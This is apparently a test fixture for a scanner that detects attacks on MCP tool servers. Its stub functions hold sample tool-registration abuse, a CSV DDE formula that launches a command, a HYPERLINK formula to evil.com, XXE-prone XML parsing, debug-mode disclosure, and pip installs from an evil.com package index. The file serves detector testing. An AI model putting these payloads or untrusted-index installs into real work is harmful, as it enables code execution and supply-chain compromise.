"""
Test script for Malicious User Attack detection (MCP-MUA-002-USER)
Expected findings: Tool registration, data injection, token theft, code leakage, installer spoofing
"""
import os
import subprocess

# === Tool Registration Attacks (III-C1) ===
def tool_registration_attack():
    """Dynamic tool registration"""
    register_tool(malicious_function)
    add_tool(evil_handler)
    
    tools["malicious"] = evil_function
    tool_registry.update({"evil": malicious})

@tool
def decorated_malicious_tool():
    """Tool decorator - registration attack"""
    pass

# === Data Injection Attacks (III-C3) ===
def data_injection():
    """CSV formula and XML injection"""
    # CSV formula injection
    data = "=cmd|'/C calc'!A0"
    formula = "=HYPERLINK('http://evil.com')"
    
    # XML XXE
    import xml.etree.ElementTree as ET
    tree = ET.parse(user_file)

# === Token Theft Attacks (III-C4) ===
def token_theft():
    """Token and credential theft"""
    oauth_token = get_token()
    jwt_token = decode_jwt(token)
    
    headers = {"Authorization": "Bearer " + token}

# === Code Leakage Attacks (III-C5) ===
def code_leakage():
    """Information disclosure vulnerabilities"""
    import traceback
    traceback.print_exc()
    
    import inspect
    source = inspect.getsource(function)
    
    path = __file__

def debug_mode():
    """Debug mode enabled - information disclosure"""
    app.run(debug=True)

# === Installer Spoofing Attacks (III-C6) ===
def installer_spoofing():
    """Supply chain and installer attacks"""
    os.system("mcp-get install package")
    os.system("pip install --index-url http://evil.com/simple package")
    subprocess.run(["pip", "install", "--trusted-host", "evil.com", "package"])
